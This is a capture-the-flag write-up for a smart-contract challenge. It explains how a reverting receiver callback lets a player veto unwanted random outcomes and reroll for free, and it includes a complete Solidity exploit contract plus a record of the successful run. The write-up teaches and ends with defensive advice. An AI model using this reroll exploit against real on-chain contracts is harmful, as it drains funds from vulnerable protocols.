# PlatyPals: accepting only legendary boxes with callback-triggered reverts

[По-русски](solve.ru.md)

## 0. Goal and solution idea

`Setup` gives the mystery-box shop 100 ETH and declares victory when its balance drops **below 10 ETH**. Every box costs 1 ETH, and the shop pays **50 ETH** for a legendary pal. One legendary can reduce the treasury to approximately 51 ETH; selling two leaves roughly 2 ETH.

Legendaries appear with a nominal probability of 1%. Repeatedly buying and opening normal boxes at 1 ETH would be expensive. The working solution paid for one box, then used a **reverting receiver callback** to reject unwanted rarity results. The backend interpreted the reverted opening as a failed operation and retried with fresh randomness, without consuming the box.

## 1. The ordering bug in Chal.sol

Relevant code from `Chal.openBoxes`:

```solidity
uint256 id = nextUnopened++;
address owner = boxOwner[id];
uint8 rarity = rolls[i] == 0 ? LEGENDARY :
              rolls[i] < 10 ? EPIC :
              rolls[i] < 40 ? RARE : COMMON;
pals[owner][rarity]++;
emit BoxOpened(id, owner, rarity);

if (owner.code.length > 0) {
    require(
        IPalReceiver(owner).onPalReceived(id, rarity)
            == IPalReceiver.onPalReceived.selector,
        "Pal not accepted"
    );
}
```

The backend alone is authorized to call `openBoxes`. It supplies an externally generated `uint8` roll in `[0,99]`, and a roll equal to zero is legendary.

The code increments `nextUnopened` and credits the new pal **before** invoking the user-controlled `onPalReceived` callback. But an EVM revert in that callback reverts the **whole transaction**, not just the callback: the `nextUnopened` increment, mapping update and emitted event disappear too. Consequently, the very same purchased box stays unopened.

## 2. Backend retries create a free reroll

The actual `service/box_opener.py` loop:

```python
unopened = shop.functions.nextBoxId().call() - shop.functions.nextUnopened().call()
if unopened > 0:
    rolls = [secrets.randbelow(100) for _ in range(min(unopened, 16))]
    receipt = send(openBoxes(rolls))
    if receipt.status != 1:
        logging.warning("Opening %s boxes failed, trying again", len(rolls))
```

The loop repeats after a short pause. Since its random rolls come from `secrets.randbelow(100)` on **every retry**, the player is effectively offered an independent 1%-chance trial without paying for another box. The attack does **not** predict the random generator; it makes the protocol redo the random draw until a favorable outcome appears.

For a geometric probability `p=0.01`, the expected number of tries per legendary is 100, though any particular run can be much shorter or longer.

## 3. What the malicious receiver must do

The recorded successful implementation was `RerollReceiver`, compiled with Solidity 0.8.26. Its crucial callback behavior was:

```solidity
function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
    require(rarity == 3, "reroll");
    return IPalReceiver.onPalReceived.selector;
}
```

A complete receiver also needs a payable method to purchase a box via the shop and a method to sell a legendary, because `boxOwner[id]` is the contract and the payout must be initiated as that owner. For a local reproduction, a receiver can implement:

```solidity
interface IShop {
    function buyBox() external payable returns (uint256);
    function sellLegendary() external;
}
interface IPalReceiver {
    function onPalReceived(uint256 boxId, uint8 rarity) external returns (bytes4);
}

contract RerollReceiver is IPalReceiver {
    IShop public immutable shop;
    address public immutable owner;
    constructor(address shop_) { shop = IShop(shop_); owner = msg.sender; }
    function buy() external payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);
        shop.buyBox{value: msg.value}();
    }
    function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
        require(msg.sender == address(shop));
        require(rarity == 3, "reroll");
        return IPalReceiver.onPalReceived.selector;
    }
    function sell() external {
        require(msg.sender == owner);
        shop.sellLegendary();
    }
    receive() external payable {}
}
```

This contract is a **source-faithful reconstruction**, not claimed to be the verbatim deployed bytecode; the historical report confirms the `require(rarity==3, "reroll")` logic but the final full contract source was not saved in the given ZIP.

## 4. Why we bought one box at a time

The backend processes up to `BATCH_SIZE=16` boxes in one transaction. If several boxes belonged to the receiver and *any* nonlegendary callback reverted, the **entire batch** would revert, including potentially favorable earlier boxes. Buying exactly **one unopened box** makes each trial independent and avoids this batch-side effect.

The successful run followed this deliberately:

1. Deploy `RerollReceiver` pointed at `Setup.TARGET()`.
2. Buy one box for 1 ETH, then allow the backend to retry automatically until rarity 3.
3. Call the receiver's sale method, yielding a 50 ETH payout from the shop.
4. Buy the second box, wait for another legendary, and sell that one.
5. Verify `Setup.isSolved()`.

## 5. The actual live record

The saved Git-bridge report `task_b67579adc03e4ed9595d66289ae26da5` records:

- First legendary arrived around block **31** after purchase.
- The second required about **330 rejected openings** before success.
- After two purchases and two buybacks: `100 + 1 - 50 + 1 - 50 = 2 ETH`.
- `Chal.balance = 2 ether` and `isSolved() == true`.
- The platform accepted the flag.

The same report notes that many reverting backend transactions stressed the RPC connection; reconnecting and retrying transport reads helped. This was a service availability issue, separate from the contract bug.

## 6. Defense and general lesson

It is not enough to use a secure random generator. The random result must also be **non-retryable at no cost**. Recording the sampled rarity in a prior final transaction (or otherwise committing the sample before the receiver callback), and separating notification from settlement, stops user code from vetoing unwanted draws. External callbacks must not control whether a paid, randomly selected state transition becomes final.

## Original challenge source

The relevant challenge source is now bundled under `assets/`: [`Chal.sol`](assets/Chal.sol), [`Setup.sol`](assets/Setup.sol), [`box_opener.py`](assets/box_opener.py). These are the shipped contract/backend files; separately presented example solvers must not be confused with original historical exploit files.
